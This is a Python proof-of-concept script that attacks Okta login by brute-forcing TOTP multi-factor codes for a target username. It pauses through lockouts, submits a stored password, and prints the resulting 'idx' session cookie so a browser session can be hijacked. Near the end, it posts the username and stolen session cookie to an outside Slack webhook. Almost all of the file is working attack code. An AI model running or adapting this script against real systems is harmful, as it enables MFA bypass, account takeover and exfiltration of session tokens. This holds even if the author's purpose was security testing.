import requests
import re
import json
import sys
import random
import time
import os, subprocess

# verify we're not on a dangerous IP - we don't want to get it blocked!
ip = subprocess.check_output(['curl','ifconfig.co'],stderr=subprocess.DEVNULL).decode(sys.stdout.encoding).rstrip()
if ip.startswith("8.29") or ip.startswith("65.36"):
    print("You're on a dangerous IP address: "+str(ip)+".  Exiting.")
    exit()

# Proxy through Burp for debugging
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Let's loop until our code guess generates a "200 OK" reponse
print()
found = 0
while found == 0 :

#
# Initial GET request to /
#

# Use requests' Session class to store cookies
    s = requests.Session()

    url = "https://domain.okta.com/app/UserHome?iss=https%3A%2F%2Fdomain.okta.com&session_hint=AUTHENTICATED"
    head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

    response = s.get(url, headers = head)

#
# Send GET to /oauth2/v1/authorize?client_id
#

    url = "https://domain.okta.com/oauth2/v1/authorize?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26&code_challenge=_TAFReuR-zWk4iGVKZBrxcFsQTQYL3Ez08JdB5yHUEQ&code_challenge_method=S256&nonce=K9aFEL8fb5jpESRGKYVMHhq7egBraQaF8JynRMM8HXlOMhhJ5yCTNsF0copdZvfY&redirect_uri=https%3A%2F%2Fdomain.okta.com%2Fenduser%2Fcallback&response_type=code&state=M7Dod5TYUPJg2z6D5E4jju0OCvenshQ0P4SSNwPeJobZA4cXTrrbMgBqW56tsTyZ&scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self%20okta.internal.enduser.read%20okta.internal.enduser.manage%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage"
    head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

    response = s.get(url, headers = head)

    r = response.text

    for line in r.splitlines():
        if (line.find("var stateToken ")) > 0:
            stateToken = line.split('\'')[1::2]

#
# POST to /idp/idx/authenticators/poll/cancel
#

    url = "https://domain.okta.com/idp/idx/authenticators/poll/cancel"
    head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
    jobj = {"reason":"OV_UNREACHABLE_BY_LOOPBACK","statusCode":None,"stateHandle":stateToken[0]}

# json.dumps converts dictionary to string
    jsend = json.dumps(jobj)

# If stateToken still has backslashes, response = 401 expired
# Our token has \\x2D and gets 401 expired, so we know this is not what to send
# So let's do the conversion here

    jobj = {"reason":"OV_UNREACHABLE_BY_LOOPBACK","statusCode":None,"stateHandle":stateToken[0].replace('\\x2D', '-')}
    jsend = json.dumps(jobj)

    response = s.post(url, data = jsend, headers = head)

    r = response.text
    r_dict = json.loads(r)

#
# POST to /idp/idx/identify
#

    url = "https://domain.okta.com/idp/idx/identify"
    head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

    jobj = {"identifier":sys.argv[1],"stateHandle":r_dict['stateHandle']}
    jsend = json.dumps(jobj)

    response = s.post(url, data = jsend, headers = head)

    r = response.text
    r_dict = json.loads(r)

    authid = r_dict["remediation"]["value"][0]["value"][0]["options"][0]["value"]["form"]["value"][0]["value"][0:20]

#
# POST to /idp/idx/challenge #1
#

    url = "https://domain.okta.com/idp/idx/challenge"
    head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

    jobj = {"authenticator":{"id":authid,"methodType":"totp"},"stateHandle":r_dict['stateHandle']}
    jsend = json.dumps(jobj)

    response = s.post(url, data = jsend, headers = head)

    r = response.text
    r_dict = json.loads(r)
    authidpass = r_dict["remediation"]["value"][1]["value"][0]["options"][1]["value"]["form"]["value"][0]["value"]

#
# POST to /idp/idx/challenge/answer (TOTP passcode)
#

    url = "https://domain.okta.com/idp/idx/challenge/answer"
    head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

    s.cookies.set("ln", sys.argv[1], domain="domain.okta.com")
    s.cookies.set("okta_user_lang", "en", domain="domain.okta.com")

#
# Need to make passcode guess a random 6 digit number here
# Need to loop until we get a 200 or 429 response
# Maybe for POC we just take in the correct 6 digit code as user-supplied input from command line
#

    response.status_code = 400

# Guess 1 random TOTP every 5 minutes
    while response.status_code == 400 and found == 0 :
        guess = str(random.randrange(100000, 1000000))
        print("Guessing 6 digit code "+guess+" for user "+sys.argv[1]+": ", end="")
        jobj = {"credentials":{"totp":guess},"stateHandle":r_dict['stateHandle']}
        jsend = json.dumps(jobj)
        response = s.post(url, data = jsend, headers = head)
        if response.status_code == 200 :
            print("Success!")
            found = 1
        if response.status_code == 429 :
            print("Lockout detected, sleeping 300 seconds")
            for i in range(300,0,-15):
                sys.stdout.write(str(i)+' ')
                sys.stdout.flush()
                time.sleep(15)
            print()            
        if response.status_code == 400:
            print("wrong code")
            time.sleep(301)
        else:
            print("Status code: " + str(response.status_code))

r = response.text
r_dict = json.loads(r)

#
# POST to /idp/idx/challenge #2
#

url = "https://domain.okta.com/idp/idx/challenge"
head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

jobj = {"authenticator":{"id":authidpass},"stateHandle":r_dict['stateHandle']}
jsend = json.dumps(jobj)

response = s.post(url, data = jsend, headers = head)

r = response.text
r_dict = json.loads(r)

# if we gave the wrong passcode before (and got a 400), the response changes, affecting the next line

authid = r_dict["remediation"]["value"][1]["value"][0]["options"][1]["value"]["form"]["value"][0]["value"]

#
# 2nd POST to /idp/idx/challenge/answer (password)
#

# I don't want to put my password in this code, so let's read it from a file
with open('pass.txt') as f:
    passw = f.readline().strip('\n')

url = "https://domain.okta.com/idp/idx/challenge/answer"
head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

jobj = {"credentials":{"passcode":passw},"stateHandle":r_dict['stateHandle']}
jsend = json.dumps(jobj)

print("Sending password for the 2nd mfa method...")
response = s.post(url, data = jsend, headers = head)

r = response.text
r_dict = json.loads(r)

# I don't think I need to parse any of the reponse here

#
# GET /login/token/redirect 
#

stateHandle2=r_dict['stateHandle'][:-4]
url = "https://domain.okta.com/login/token/redirect?stateToken="+stateHandle2
head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

response = s.get(url, headers = head)

#
# GET /app/UserHome?iss=https%3A%2F%2Fdomain.okta.com&session_hint=AUTHENTICATED
#

url = "https://domain.okta.com/app/UserHome?iss=https%3A%2F%2Fdomain.okta.com&session_hint=AUTHENTICATED"
head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://domain.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

response = s.get(url, headers = head)

print()
print("Your Okta session is waiting")
print()
print("To claim your session:")
print("- Point a browser to https://domain.okta.com")
print("- Add a cookie named idx with this value:")
print()
idxvalue = s.cookies.get_dict()['idx']
print(idxvalue)
print()
print("- Browse to https://domain.okta.com/app/UserHome?iss=https%3A%2F%2Fdomain.okta.com&session_hint=AUTHENTICATED")
print()
print("Enjoy!")
print()

# 
# Send a webhook to Slack with the results
#

webh = {"username":sys.argv[1],"idx":idxvalue}

url = "https://hooks.slack.com/workflows/blahblah"
jsend = json.dumps(webh)
response = s.post(url, data = jsend)

# We've obtained our cookie, time to kill this script
exit()
